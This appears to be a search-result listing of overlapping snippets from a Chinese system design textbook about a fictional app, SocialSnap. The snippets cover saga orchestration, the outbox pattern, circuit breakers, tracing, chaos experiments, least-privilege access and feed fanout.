  c15_b01.md: ...卡收费（Payment Service）。 2. 更新用户账户，设置 `is_premium = true`（User Service）。 3. 发送“欢迎加入高级版！”确认邮件（Notification Service）。  每一步都触及不同服务，各有...
  c15_b01.md: ...ium = true`（User Service）。 3. 发送“欢迎加入高级版！”确认邮件（Notification Service）。  每一步都触及不同服务，各有自己的数据库。两阶段提交（第 12 章）可以原子地协调它们——但 Payment Se...
  c15_b01.md: ...ce）。  每一步都触及不同服务，各有自己的数据库。两阶段提交（第 12 章）可以原子地协调它们——但 Payment Service 使用不参与 2PC 的第三方支付处理器。User Service 是 PostgreSQL 数据库。Notificat...
  c15_b01.md: ...12 章）可以原子地协调它们——但 Payment Service 使用不参与 2PC 的第三方支付处理器。User Service 是 PostgreSQL 数据库。Notification Service 使用邮件 API。这些系统无法共享分布式事...
  c15_b01.md: ...参与 2PC 的第三方支付处理器。User Service 是 PostgreSQL 数据库。Notification Service 使用邮件 API。这些系统无法共享分布式事务。  如果第 1 步成功但第 2 步失败会怎样？用户已被扣款，却仍然不是高...
  c15_b05.md: ...显式写出如下：  步骤 | 服务 | 正向操作 | 补偿事务 |---|---|---|--- 1 | Payment Service | 信用卡扣 9.99 USD | 退款 9.99 USD 2 | User Service | 设置 user 42...
  c15_b05.md: ...1 | Payment Service | 信用卡扣 9.99 USD | 退款 9.99 USD 2 | User Service | 设置 user 42 的 `is_premium = true` | 设置 user 42 的 `is_premi...
  c15_b05.md: ...true` | 设置 user 42 的 `is_premium = false` 3 | Notification Service | 发送确认邮件 | （无法补偿——邮件不能撤回。记录问题。）  Saga 执行：第 1 步成功，第 2 步成功，第...
  c15_b05.md: ...用户最终回到起点——不是高级版，也没被扣款。失败被记录。他们可以稍后重试。  但如果第 2 步失败（升级期间 User Service 宕机）呢？saga 补偿：撤销第 1 步（退款）。第 3 步没跑，所以无需撤销。  关于第 3 步的重点：发邮件不可补...
  c15_b06.md: ...Checkout Handler 发布 `user.upgrade.initiated` 事件。 2. Payment Service 监听 `user.upgrade.initiated`，扣款，并发布 `payment.charge.succeede...
  c15_b06.md: ...yment.charge.succeeded`（或 `payment.charge.failed`）。 3. User Service 监听 `payment.charge.succeeded`，把用户更新为高级版，并发布 `user.upgraded....
  c15_b06.md: ...`，把用户更新为高级版，并发布 `user.upgraded.to.premium`。 4. Notification Service 监听 `user.upgraded.to.premium`，发送邮件。  补偿：如果 User Service 失败并...
  c15_b06.md: ...ion Service 监听 `user.upgraded.to.premium`，发送邮件。  补偿：如果 User Service 失败并发布 `user.upgrade.failed`，Payment Service 监听 `user.upgrad...
  c15_b06.md: ...邮件。  补偿：如果 User Service 失败并发布 `user.upgrade.failed`，Payment Service 监听 `user.upgrade.failed` 并发起退款。   #### 定义：编舞  **编舞（Choreogr...
  c15_b06.md: ...aga。编排器显式按顺序调用每个服务，接收结果，决定下一步做什么。  高级版升级编排器：  1. 调用 Payment Service：扣 9.99 USD。等待结果。 2. 若成功：调用 User Service：设置 `is_premium = tr...
  c15_b06.md: ...编排器：  1. 调用 Payment Service：扣 9.99 USD。等待结果。 2. 若成功：调用 User Service：设置 `is_premium = true`。等待结果。 3. 若成功：调用 Notification Service...
  c15_b06.md: ...Service：设置 `is_premium = true`。等待结果。 3. 若成功：调用 Notification Service：发送邮件。等待结果。 4. 若任一步失败：按相反顺序调用补偿。...
  c15_b07.md: ...运维的新服务。它可能成为瓶颈（所有 saga 协调都经过它）。它引入了对其他服务的了解——编排器“知道”Payment Service、User Service 和 Notification Service 的细节，造成耦合。   #### 选哪个？...
  c15_b07.md: ...颈（所有 saga 协调都经过它）。它引入了对其他服务的了解——编排器“知道”Payment Service、User Service 和 Notification Service 的细节，造成耦合。   #### 选哪个？  选择取决于 saga 多复...
  c15_b07.md: ...其他服务的了解——编排器“知道”Payment Service、User Service 和 Notification Service 的细节，造成耦合。   #### 选哪个？  选择取决于 saga 多复杂，以及你需要多大可见度。  简单 saga（...
  c15_b07.md: ...15.6 Outbox 模式——可靠事件发布  上面描述的 saga 模式依赖服务可靠发布事件。但考虑 Payment Service：       BEGIN;         INSERT INTO payments (user_id, amount...
  c15_b09.md: ...消息中继发布 outbox 事件。升级编排器收到事件并开始协调。  **第 3 步：** 编排器调用 Payment Service：“给用户 42 扣 9.99 USD，幂等键 `saga_7f3a9b2c_charge`。”  **第 4 步：**...
  c15_b09.md: ...扣 9.99 USD，幂等键 `saga_7f3a9b2c_charge`。”  **第 4 步：** Payment Service 检查 `saga_7f3a9b2c_charge` 是否处理过。没有。它扣款，把结果记录在 `processed_op...
  c15_b09.md: ....charge.succeeded`。更新 saga 记录状态为 `PAYMENT_COMPLETE`。调用 User Service：“设置用户 42 为高级版，幂等键 `saga_7f3a9b2c_upgrade`。”  **第 6 步：** Use...
  c15_b09.md: ...设置用户 42 为高级版，幂等键 `saga_7f3a9b2c_upgrade`。”  **第 6 步：** User Service 更新用户，并向自己的 outbox 写入 `user.upgraded.to.premium` 事件。  **第 7...
  c15_b09.md: ...ded.to.premium`。更新 saga 记录为 `USER_UPGRADED`。调用 Notification Service：“给用户 42 发送高级版确认邮件。”  **第 8 步：** Notification Service 发送邮件（不...
  c15_b09.md: ...cation Service：“给用户 42 发送高级版确认邮件。”  **第 8 步：** Notification Service 发送邮件（不可补偿——但它是最后一步，所以只有前面步骤成功才会到达这里）。  **第 9 步：** 编排器收到 Not...
  c15_b09.md: ...——但它是最后一步，所以只有前面步骤成功才会到达这里）。  **第 9 步：** 编排器收到 Notification Service 确认。更新 saga 记录为 `COMPLETE`。用户浏览器轮询升级状态，收到 `COMPLETE` 后显示“欢迎加...
  c15_b12.md: ..._id: 77, request_id: "req_a1b2c3"}`。  **第 1 步——Social Graph Service：** 监听 `follow.requested`。在 `friendships` 表中插入 `{follower: 4...
  c15_b12.md: ...布 `follow.graph.updated` 事件，带上 `request_id`。  **第 2 步——User Service：** 监听 `follow.graph.updated`。为用户 77 递增 `follower_count`。（使用...
  c15_b12.md: ...r.count.updated` 事件，带上 `request_id`。  **第 3 步——Notification Service：** 监听 `follow.follower.count.updated`。获取用户 77 的通知偏好（用户 77 是...
  c15_b12.md: ...ow.notification.sent` 事件。  **补偿流：**  如果第 1 步失败（Social Graph Service 宕机）：`follow.requested` 消息留在队列中重试。如果重试耗尽，编排器（或监控告警）把关注标记为失败。...
  c15_b12.md: ...告警）把关注标记为失败。无需补偿——还没有任何变更。  如果第 2 步在第 1 步成功后失败：Social Graph Service 发布 `follow.graph.update.failed`。User Service 监听该事件（它已从第 1 步...
  c15_b12.md: ...败：Social Graph Service 发布 `follow.graph.update.failed`。User Service 监听该事件（它已从第 1 步事件知道请求）——但此情况下第 2 步尚未执行，所以无需补偿。`follow.graph....
  c15_b12.md: ...件”的 saga 重写为基于编排的 saga。你的编排器必须正确处理以下失败场景：(a) 支付扣款失败（Payment Service 返回错误）；(b) 支付成功但 User Service 不可用；(c) 所有步骤成功，但编排器在标记 saga 完成...
  c15_b12.md: ...须正确处理以下失败场景：(a) 支付扣款失败（Payment Service 返回错误）；(b) 支付成功但 User Service 不可用；(c) 所有步骤成功，但编排器在标记 saga 完成前崩溃。  提示  编排器必须持久化其状态（当前所在步骤）...
  c15_b13.md: ...*  1. 开始：设置 `current_step = PAYMENT_PENDING`。用幂等键调用 Payment Service。等待（超时 30 秒）。 2. 支付成功：设置 `current_step = USER_PENDING`，保存 `p...
  c15_b13.md: ...urrent_step = USER_PENDING`，保存 `payment_result`。用幂等键调用 User Service。等待。 3. User Service 成功：设置 `current_step = EMAIL_PENDING`。调用...
  c15_b13.md: ...ENDING`，保存 `payment_result`。用幂等键调用 User Service。等待。 3. User Service 成功：设置 `current_step = EMAIL_PENDING`。调用 Notification Servic...
  c15_b13.md: ...ervice 成功：设置 `current_step = EMAIL_PENDING`。调用 Notification Service。等待。 4. 邮件已发：设置 `current_step = COMPLETE`。返回成功给轮询客户端。  **失败场...
  c15_b13.md: ..._step = COMPLETE`。返回成功给轮询客户端。  **失败场景 (a)：支付扣款失败。** Payment Service 返回错误（无效卡、余额不足等）。编排器记录 `current_step = FAILED`。无需补偿——没有任何状态被...
  c15_b13.md: ...= FAILED`。无需补偿——没有任何状态被改变。向客户端返回失败原因。  **失败场景 (b)：支付成功，User Service 不可用。** 编排器设置 `current_step = USER_PENDING`。调用 User Service—...
  c15_b13.md: ...Service 不可用。** 编排器设置 `current_step = USER_PENDING`。调用 User Service——超时或报错。编排器以指数退避重试最多 5 次。如果全部失败，转入 `current_step = COMPENSAT...
  c15_b13.md: ...避重试最多 5 次。如果全部失败，转入 `current_step = COMPENSATING`。向 Payment Service 发起退款（幂等键 `saga_7f3a9b2c_refund`）以补偿扣款。记录 `current_step = FA...
  c15_b13.md: ...于 `EMAIL_PENDING`（COMPLETE 之前的最后一步）。它重试邮件步骤（使用 Notification Service 的幂等键）。邮件已发送——Notification Service 的幂等检查返回“已发送”而不发送重复邮件。编排器设...
  c15_b13.md: ...）。它重试邮件步骤（使用 Notification Service 的幂等键）。邮件已发送——Notification Service 的幂等检查返回“已发送”而不发送重复邮件。编排器设置 `current_step = COMPLETE`。Saga 正...
  c15_b15.md: ...一个真实张力。一个知道其他五个服务 API、数据模型和失败模式的 saga 编排器确实与它们耦合。如果 Payment Service API 改变，编排器也要改。编排器不能独立于它编排的服务部署。  然而，这个争论混淆了两种不同类型的耦合：  **数据...
  c16_b01.md: ...部耗尽。每条线程都在等待 Redis。新请求在负载均衡器队列中堆积，超出队列限制。负载均衡器开始向所有用户返回“503 Service Unavailable”。  SocialSnap 宕机了。  不是因为数据库故障。不是因为应用代码崩溃。而是因为一个...
  c16_b14.md: ...#### 应用问题  **Q1.** SocialSnap 的应用服务器为典型页面加载调用三个服务：User Service（获取登录用户资料）、Feed Service（获取用户 feed）、Trending Service（获取热门话题）。...
  c16_b14.md: ...SocialSnap 的应用服务器为典型页面加载调用三个服务：User Service（获取登录用户资料）、Feed Service（获取用户 feed）、Trending Service（获取热门话题）。每个服务可用性（availability）99...
  c16_b14.md: ...个服务：User Service（获取登录用户资料）、Feed Service（获取用户 feed）、Trending Service（获取热门话题）。每个服务可用性（availability）99%。没有熔断器时页面加载成功概率是多少？使用熔断器（ci...
  c16_b14.md: ...）99%。没有熔断器时页面加载成功概率是多少？使用熔断器（circuit breaker）和优雅降级（Trending Service 失败被优雅处理）后概率是多少？  提示  考虑哪些服务失败是阻塞性（阻止页面加载）的，哪些是非阻塞性（使页面降级但不阻...
  c16_b14.md: ...99 = 0.970。97.0%（97%）成功率——约 1.99% 页面加载失败。  使用熔断器并对 Trending Service 优雅降级：Trending Service 失败只导致热门话题从页面省略，但页面加载成功。只要 User Servic...
  c16_b14.md: ...功率——约 1.99% 页面加载失败。  使用熔断器并对 Trending Service 优雅降级：Trending Service 失败只导致热门话题从页面省略，但页面加载成功。只要 User Service 和 Feed Service 成功，无论...
  c16_b14.md: ...ervice 优雅降级：Trending Service 失败只导致热门话题从页面省略，但页面加载成功。只要 User Service 和 Feed Service 成功，无论 Trending Service 如何，页面都加载成功。  User Ser...
  c16_b14.md: ...nding Service 失败只导致热门话题从页面省略，但页面加载成功。只要 User Service 和 Feed Service 成功，无论 Trending Service 如何，页面都加载成功。  User Service 和 Feed Ser...
  c16_b14.md: ...从页面省略，但页面加载成功。只要 User Service 和 Feed Service 成功，无论 Trending Service 如何，页面都加载成功。  User Service 和 Feed Service 同时成功的概率 = 0.99 × 0...
  c16_b14.md: ...ice 和 Feed Service 成功，无论 Trending Service 如何，页面都加载成功。  User Service 和 Feed Service 同时成功的概率 = 0.99 × 0.99 = 0.9801。只要两个核心服务在线，页面...
  c16_b14.md: ...ice 成功，无论 Trending Service 如何，页面都加载成功。  User Service 和 Feed Service 同时成功的概率 = 0.99 × 0.99 = 0.9801。只要两个核心服务在线，页面就加载（无论是否带热门话题）。...
  c16_b14.md: ...线，Trending 失败）：0.99 × 0.99 × 0.01 = 0.98% * **页面完全失败**（User Service 或 Feed Service 失败）：1 − 0.9801 = 1.99%  这一改进（约 3% 页面完全失败 → 1...
  c16_b14.md: ...0.99 × 0.99 × 0.01 = 0.98% * **页面完全失败**（User Service 或 Feed Service 失败）：1 − 0.9801 = 1.99%  这一改进（约 3% 页面完全失败 → 1.99% 完全失败，另有 0....
  c17_b04.md: ..."2024-01-15T14:47:23.441Z",       "level": "ERROR",       "service": "profile-service",       "event": "profile_load_failed",...
  c17_b04.md: ...23.441Z",       "level": "ERROR",       "service": "profile-service",       "event": "profile_load_failed",       "user_id": "u...
  c17_b04.md: ...、ERROR、FATAL。级别让你过滤噪声：生产环境通常只看 INFO 及以上；调试时临时开启 DEBUG。 3. **Service and version**——哪个服务产生这条日志，以及运行代码的哪个版本。当 bug 部署然后修复后，你需要把日志事...
  c17_b06.md: ...，单次用户请求加载 news feed 可能调用五个服务：  1. API Gateway——接收请求，通过 Auth Service 认证用户 2. Auth Service——验证 JWT token 3. Feed Service——决定展示哪些帖...
  c17_b06.md: ...能调用五个服务：  1. API Gateway——接收请求，通过 Auth Service 认证用户 2. Auth Service——验证 JWT token 3. Feed Service——决定展示哪些帖子 4. Post Service——为每...
  c17_b06.md: ...，通过 Auth Service 认证用户 2. Auth Service——验证 JWT token 3. Feed Service——决定展示哪些帖子 4. Post Service——为每个 post ID 拉取帖子内容 5. User Servi...
  c17_b06.md: ...uth Service——验证 JWT token 3. Feed Service——决定展示哪些帖子 4. Post Service——为每个 post ID 拉取帖子内容 5. User Service——为每个帖子拉取作者资料  每个服务都有自己的...
  c17_b06.md: ...rvice——决定展示哪些帖子 4. Post Service——为每个 post ID 拉取帖子内容 5. User Service——为每个帖子拉取作者资料  每个服务都有自己的日志。如果请求慢，你需要知道哪个服务贡献了延迟。如果请求失败，你需要知道...
  c17_b06.md: ...API Gateway: handle GET /feed         [5ms - 20ms]   Auth Service: validate_jwt (15ms)         [22ms - 240ms] Feed Service: g...
  c17_b06.md: ...th Service: validate_jwt (15ms)         [22ms - 240ms] Feed Service: get_feed (218ms)           [25ms - 50ms]  Redis: get cache...
  c17_b06.md: ...get cached_feed (25ms) → MISS           [52ms - 200ms] Post Service: fetch_posts (148ms)             [55ms - 80ms]  Database: S...
  c17_b06.md: ...ts WHERE id IN (...) (25ms)             [85ms - 195ms] User Service: fetch_authors (110ms)               [88ms - 190ms] Databas...
  c17_b06.md: ...eed (33ms)   这一条追踪讲述了指标无法讲述的故事：总请求耗时 245ms，大部分（148ms）在 Post Service，其中大部分（102ms）等待 User Service 的数据库查询。feed 缓存未命中。知道这些，工程师立刻知道该...
  c17_b06.md: ...故事：总请求耗时 245ms，大部分（148ms）在 Post Service，其中大部分（102ms）等待 User Service 的数据库查询。feed 缓存未命中。知道这些，工程师立刻知道该看哪里：User Service 的数据库查询是瓶颈。...
  c17_b06.md: ...2ms）等待 User Service 的数据库查询。feed 缓存未命中。知道这些，工程师立刻知道该看哪里：User Service 的数据库查询是瓶颈。...
  c17_b12.md: ...）。  **Q3.** 一次用户登录请求的分布式追踪显示以下 spans：API Gateway（10ms）、Auth Service（380ms）、Auth Service 下无子 span。Auth Service 对该 trace ID 的日志条目...
  c17_b12.md: ...的分布式追踪显示以下 spans：API Gateway（10ms）、Auth Service（380ms）、Auth Service 下无子 span。Auth Service 对该 trace ID 的日志条目为：`INFO validate_jwt...
  c17_b12.md: ...ateway（10ms）、Auth Service（380ms）、Auth Service 下无子 span。Auth Service 对该 trace ID 的日志条目为：`INFO validate_jwt (5ms)`、`INFO fetch_us...
  c17_b12.md: ...计测试在行动前证实或证伪它。  **答案：** 已收集证据：登录请求总耗时 390ms，其中 380ms 在 Auth Service。Auth Service 内部，JWT 验证很快（5ms），用户资料缓存很快（2ms），但数据库获取很慢（370ms）...
  c17_b12.md: ...。  **答案：** 已收集证据：登录请求总耗时 390ms，其中 380ms 在 Auth Service。Auth Service 内部，JWT 验证很快（5ms），用户资料缓存很快（2ms），但数据库获取很慢（370ms）——几乎占了观察到的全部延...
  c17_b12.md: ...(a) 查询查找列（用户 ID 或邮箱）缺少索引，(b) 数据库高负载导致查询排队，(c) 数据库连接池饱和，Auth Service 在执行查询前等待连接。  **下一步调查：**  1. 检查 Auth Service 数据库连接池指标——池利用率是...
  c17_b12.md: ...) 数据库连接池饱和，Auth Service 在执行查询前等待连接。  **下一步调查：**  1. 检查 Auth Service 数据库连接池指标——池利用率是否高？ 2. 检查该时段数据库慢查询日志——是这条特定查询慢，还是数据库整体慢？ 3....
  c17_b12.md: ...的 `EXPLAIN` 输出——是否使用索引？ 4. 检查这是孤立事件（一次慢追踪）还是系统性（该时段所有 Auth Service DB 查询都慢）。  这就是应用的侦探纪律：证据足够具体以形成假设，假设产生可证伪的测试，只需一个测试结果就考虑下一个...
  c18_b02.md: ...#### 集成测试  服务集成测试让单个服务针对真实（或真实感）的依赖实例运行。对 SocialSnap 的 Feed Service，集成测试可能：  1. 启动一个 PostgreSQL 实例（测试环境用 Docker） 2. 填充测试数据（10 个...
  c18_b02.md: ...测试数据（10 个用户、50 条帖子） 3. 启动一个 Redis 实例 4. 启动配置为指向这些测试实例的 Feed Service 5. 向 Feed Service 发 HTTP 请求 6. 断言响应  这种测试比单元测试慢得多——可能 5–30...
  c18_b02.md: ...） 3. 启动一个 Redis 实例 4. 启动配置为指向这些测试实例的 Feed Service 5. 向 Feed Service 发 HTTP 请求 6. 断言响应  这种测试比单元测试慢得多——可能 5–30 秒——但它捕获单元测试完全遗漏的一类...
  c18_b04.md: ...* **kill 一个数据库副本：** 流量是否自动路由到主库？耗时多久？过渡期间用户体验如何？ * **向 Feed Service 到 Post Service 的调用引入 500ms 延迟：** Feed Service 的超时配置能否优雅处理？是...
  c18_b04.md: ...本：** 流量是否自动路由到主库？耗时多久？过渡期间用户体验如何？ * **向 Feed Service 到 Post Service 的调用引入 500ms 延迟：** Feed Service 的超时配置能否优雅处理？是否触发熔断器？是返回降级响应还...
  c18_b04.md: ...何？ * **向 Feed Service 到 Post Service 的调用引入 500ms 延迟：** Feed Service 的超时配置能否优雅处理？是否触发熔断器？是返回降级响应还是错误？ * **把消息队列填到 100,000 条消息：**...
  c18_b05.md: ...境学习架构是否真的如设计那样容忍失败。 3. **定义爆炸半径**——每个实验应有明确范围：“我们将终止一个 Post Service 实例，同时其他服务正常运行。”避免可能级联成完全 outage 的实验。 4. **准备停止按钮**——每个混沌实验都...
  c18_b07.md: ...新算法会提高参与率、降低参与率，还是产生意外边界情况。他们以金丝雀方式部署。  **设置：** 团队部署新的 Feed Service 版本（v2.4.0）与当前版本（v2.3.1）并存。负载均衡器配置为把 5% 用户路由到 v2.4.0。路由是粘性的—...
  c18_b12.md: ...OST /posts/{id}/reactions`——代码存在，但在功能开关打开前返回 404。 * 部署 Feed Service 变更，在功能开关开启时响应中包括 `reaction_count`。 * 功能开关“reactions”默认关闭。 *...
  c18_b12.md: ...—金丝雀（第 2 周）：**  * 对 5% 用户启用功能开关。 * 监控：reaction API 错误率、Post Service 延迟（`reaction_count` join 是否增加开销？）、数据库写吞吐（`reactions` 表新写入）。...
  c18_b12.md: ...部署与用户可见发布分离。  **Q2.** SocialSnap staging 环境的一次混沌实验揭示：当 Auth Service 被 kill 并重启时，Feed Service 在 Auth Service 不可用的 15 秒内堆积了 5000...
  c18_b12.md: ...ialSnap staging 环境的一次混沌实验揭示：当 Auth Service 被 kill 并重启时，Feed Service 在 Auth Service 不可用的 15 秒内堆积了 5000 个 pending 请求，Auth Service...
  c18_b12.md: ...环境的一次混沌实验揭示：当 Auth Service 被 kill 并重启时，Feed Service 在 Auth Service 不可用的 15 秒内堆积了 5000 个 pending 请求，Auth Service 恢复后 Feed Servi...
  c18_b12.md: ...Service 在 Auth Service 不可用的 15 秒内堆积了 5000 个 pending 请求，Auth Service 恢复后 Feed Service 同时尝试处理这 5000 个请求，压垮它并导致二次失败。诊断该模式并提出修复。  提...
  c18_b12.md: ...rvice 不可用的 15 秒内堆积了 5000 个 pending 请求，Auth Service 恢复后 Feed Service 同时尝试处理这 5000 个请求，压垮它并导致二次失败。诊断该模式并提出修复。  提示  回想第 7 章的惊群问题和第...
  c18_b13.md: ...**答案：** 这是服务恢复场景中的惊群问题。Auth Service 不可用时，进入的 feed 请求在 Feed Service 中堆积——等待认证成功后再继续。Auth Service...
  c18_b13.md: ...**答案：** 这是服务恢复场景中的惊群问题。Auth Service 不可用时，进入的 feed 请求在 Feed Service 中堆积——等待认证成功后再继续。Auth Service 恢复后，所有 5000 个等待请求同时调用它，在它完全预热前...
  c18_b13.md: ...Service 不可用时，进入的 feed 请求在 Feed Service 中堆积——等待认证成功后再继续。Auth Service 恢复后，所有 5000 个等待请求同时调用它，在它完全预热前压垮它。  **根因：** Feed Service 没有...
  c18_b13.md: ...th Service 恢复后，所有 5000 个等待请求同时调用它，在它完全预热前压垮它。  **根因：** Feed Service 没有任何限制对 Auth Service 并发调用的机制。恢复期间，它表现得好像 Auth Service 容量无限。...
  c18_b13.md: ...0 个等待请求同时调用它，在它完全预热前压垮它。  **根因：** Feed Service 没有任何限制对 Auth Service 并发调用的机制。恢复期间，它表现得好像 Auth Service 容量无限。  **修复——多层：**  1. **熔...
  c18_b13.md: ...Feed Service 没有任何限制对 Auth Service 并发调用的机制。恢复期间，它表现得好像 Auth Service 容量无限。  **修复——多层：**  1. **熔断器（第 16 章）：** Feed Service 应在 Aut...
  c18_b13.md: ...像 Auth Service 容量无限。  **修复——多层：**  1. **熔断器（第 16 章）：** Feed Service 应在 Auth Service 调用上设熔断器。Auth 宕机时熔断器打开，请求快速失败而不是堆积。这完全避免堆积，但...
  c18_b13.md: ...量无限。  **修复——多层：**  1. **熔断器（第 16 章）：** Feed Service 应在 Auth Service 调用上设熔断器。Auth 宕机时熔断器打开，请求快速失败而不是堆积。这完全避免堆积，但意味着用户在 Auth outa...
  c18_b13.md: ...户在 Auth outage 期间看到错误而非排队——这是值得做的权衡。 2. **请求超时并快速失败：** Feed Service 不应无限等待认证，而应将 Auth 调用超时设为例如 2 秒。这防止线程堆积，但意味着用户在 Auth outage...
  c18_b13.md: ...utage 期间经历错误而不是排队。 3. **带指数退避和抖动的重试（第 15 章幂等性讨论）：** 如果 Feed Service 重试失败的 Auth 调用，必须使用指数退避和抖动，让数千并发请求的重试不会同时触发。没有抖动，重试会同步并重新造成惊...
  c18_b13.md: ...动，让数千并发请求的重试不会同时触发。没有抖动，重试会同步并重新造成惊群。 4. **恢复时的负载削减：** Auth Service 在启动阶段应限制入站请求。重启后的前 30 秒最多接受 500 RPS，逐渐增加到满容量以完成预热。  这次混沌实验很...
  c19_b02.md: ...进程或系统——只应访问其完成职能所需的资源，不多不少。  plain 语言：给每个人最小必要访问，别多给。  Feed Service 用于读取帖子的数据库账户应只拥有 `posts` 表的 `SELECT` 权限，不能有 `INSERT`、`UPDAT...
  c19_b02.md: ...ECT` 权限，不能有 `INSERT`、`UPDATE`、`DELETE`、`DROP TABLE`。如果 Feed Service 被入侵，攻击者继承的只是被入侵账户的权限：只读访问 posts。他们无法删除数据、修改账户或访问支付记录。  最小权限...
  c19_b03.md: ...整 token 形如：`eyJhbGci...eyJzdWIi...SflKxwRJSMeKKF2...`  Feed Service 收到带 JWT 的请求时，用对应公钥验证签名。如果签名有效，payload 中的 claims 可信——token 由...
  c19_b03.md: ...，payload 中的 claims 可信——token 由 SocialSnap 认证服务器创建且未被篡改。Feed Service 可以从 payload 中提取 `user_id` 和 `scope` 而无需每次都调用 auth 服务器——密码学签...
  c19_b09.md: ...角色）并在启动时获取密钥。 3. 密钥可在密钥管理器中轮换，服务自动更新。 4. 对特定密钥的访问由策略控制：Feed Service 只能访问 feed 数据库的凭证——不能访问 auth 数据库凭证或支付服务凭证。这就是最小权限原则在密钥上的应用。...
  c19_b12.md: ...。  **答案：** 最小权限原则：每个实体只访问它需要的资源，不多不少。具体例子：SocialSnap 的 Feed Service 需要读取帖子和用户资料来生成 feed。它不需要写帖子、删除用户或访问支付记录。Feed Service 使用的数据库...
  c19_b12.md: ...的 Feed Service 需要读取帖子和用户资料来生成 feed。它不需要写帖子、删除用户或访问支付记录。Feed Service 使用的数据库账户应拥有：`posts` 表的 `SELECT`、`users` 表（仅限公开字段）的 `SELECT`...
  c19_b12.md: ...sts` 表的 `SELECT`、`users` 表（仅限公开字段）的 `SELECT`，仅此而已。  如果 Feed Service 被攻击者入侵——可能通过远程代码执行漏洞——攻击者只能使用被入侵账户读取帖子和用户资料。他们无法修改数据、删除记录或访...
  c19_b14.md: ...refresh_token_hash, expires_at, revoked_at  **最小权限：** Feed Service 验证 JWT 并检查 scope。具有 `read:posts` scope 的应用即使持有有效 JWT 也不能调用...
  c19_b15.md: ...“这个手机号是否已注册？”。哈希是单向的——适合等值查找，不适合显示号码。  3. **访问控制：** 只有 Auth Service 能解密手机号。Feed Service、Post Service 和其他服务没有手机号解密密钥。需要显示后 4 位的支...
  c19_b15.md: ...——适合等值查找，不适合显示号码。  3. **访问控制：** 只有 Auth Service 能解密手机号。Feed Service、Post Service 和其他服务没有手机号解密密钥。需要显示后 4 位的支持工具通过 Auth Service A...
  c19_b15.md: ...示号码。  3. **访问控制：** 只有 Auth Service 能解密手机号。Feed Service、Post Service 和其他服务没有手机号解密密钥。需要显示后 4 位的支持工具通过 Auth Service API 访问——并受审计。...
  c19_b15.md: ...d Service、Post Service 和其他服务没有手机号解密密钥。需要显示后 4 位的支持工具通过 Auth Service API 访问——并受审计。  4. **审计日志：** 每次访问用户手机号——无论是系统（发送 SMS）还是支持人员—...
  c19_b15.md: ...支持人员——都记录谁访问、何时、为何。  **支持账户恢复：** 支持人员可以调用返回手机号后 4 位的端点（Auth Service 解密并截断）。除非有明确的升级访问权限和额外授权及增强日志，否则他们看不到完整号码。  这种方法满足：用户隐私（加密，...
  c20_b10.md: ...增加短链功能。用户发帖时，SocialSnap 自动创建短版本。工程团队争论把它做成独立微服务还是集成到现有 Post Service。用本章设计证据论证两种方案，然后做决定。  提示  回想第 13 章的服务边界启发式：当不同扩展要求、不同部署节奏或不...
  c20_b10.md: ...第 13 章的服务边界启发式：当不同扩展要求、不同部署节奏或不同运营特征时，服务应分离。考虑 URL 短链与 Post Service 是否共享这些属性。  **答案：**  **支持独立微服务的论点：**  * 不同扩展画像：URL 短链读多写少（10...
  c20_b10.md: ...**答案：**  **支持独立微服务的论点：**  * 不同扩展画像：URL 短链读多写少（100:1），Post Service 写多（发帖内容）。独立服务可独立扩展——短链服务获得更多读服务器和更大缓存，Post Service 获得写优化基础设...
  c20_b10.md: ...:1），Post Service 写多（发帖内容）。独立服务可独立扩展——短链服务获得更多读服务器和更大缓存，Post Service 获得写优化基础设施。 * 不同数据存储：URL 短链数据库主要是追加（URL 创建后很少修改），而帖子频繁更新（点赞、...
  c20_b10.md: ...追加（URL 创建后很少修改），而帖子频繁更新（点赞、评论、编辑）。 * 可复用：独立 URL 短链服务可被 Post Service、DM 功能（第 21 章）、通知服务和第三方开发者通过 API 使用。 * 不同 SLO：重定向延迟（p99 100m...
  c20_b10.md: ...过 API 使用。 * 不同 SLO：重定向延迟（p99 100ms）与帖子获取要求不同。  **支持集成到 Post Service 的论点：**  * 更少网络跳数：创建包含链接的帖子需要同步调用 URL 短链服务。如果短链服务宕机（即使短暂），帖子...
  c20_b10.md: ...p 当前阶段每天不会收到 1 亿个链接创建——独立扩展的好处可能不值得其复杂度。  **决策：** 先集成到 Post Service（使用模块/库，而非直接放在请求处理器），以快速交付功能。当 (a) 扩展要求显著分化，或 (b) 其他服务需要 URL...
  c21_b17.md: ...pe: "shared_post", post_id: 12345}`）的消息。渲染该消息时，DM 客户端从 Post Service API 拉取帖子以显示。DM 数据库只存帖子 ID 引用——不存帖子内容。这维护了单一所有权原则：帖子内容由 Post...
  c21_b17.md: ...API 拉取帖子以显示。DM 数据库只存帖子 ID 引用——不存帖子内容。这维护了单一所有权原则：帖子内容由 Post Service 拥有，DM 服务只持有其引用。  集成约束：事件必须设计为向后兼容（第 18 章的 expand-contract 也...
  c22_b06.md: ...**用户 U 创建帖子 P：** U 的客户端向 API gateway 发送 `POST /posts`。Post Service 把 P 写入帖子数据库：`INSERT INTO posts (post_id, author_id, content...
  c22_b06.md: ..., content, created_at) VALUES (...)`。这是事实来源。 2. **触发 Fanout Service：** Post Service 向 Kafka 发布事件：`{event: "post_created", post_...
  c22_b06.md: ...ed_at) VALUES (...)`。这是事实来源。 2. **触发 Fanout Service：** Post Service 向 Kafka 发布事件：`{event: "post_created", post_id: P, author_id...
  c22_b06.md: ...", post_id: P, author_id: U, created_at: ...}`。 3. **Fanout Service 决定策略：**     * 从关注者数据库查 U 的关注者数    * 若关注者数 < 1,000,000：**写时扇...
  c22_b07.md: ...#### Feed 读取流程  1. **用户 F 请求 feed：** `GET /feed` 到 Feed Service。 2. **获取预计算 timeline：** `ZREVRANGEBYSCORE user:F:timeline +...
  c22_b07.md: ...ID 和名人帖子合并成约 220 个候选集合。 5. **获取帖子详情：** 对候选集合中每个帖子 ID，从 Post Service 获取帖子内容。先走缓存（第 7 章 cache-aside）：大多数帖子在 Redis 中有 24 小时 TTL 缓存...
  c22_b07.md: ...s）+ 序列化（2ms）≈ **约 24ms** 总计。远低于 200ms p99 要求。   #### Fanout Service 架构  Fanout Service 是一个 Kafka 消费者，处理 `post_created` 事件——与第 8...
  c22_b07.md: ...4ms** 总计。远低于 200ms p99 要求。   #### Fanout Service 架构  Fanout Service 是一个 Kafka 消费者，处理 `post_created` 事件——与第 8 章为 SocialSnap 通知队列...
  c22_b07.md: ...异步解耦模式相同，现在应用于 feed 投递规模。它是扇出架构的心脏：  * **水平可扩展：** 多个 Fanout Service worker 并行消费 Kafka topic。如果某帖子有 50 万（500,000）关注者，工作被分散到多个 wo...
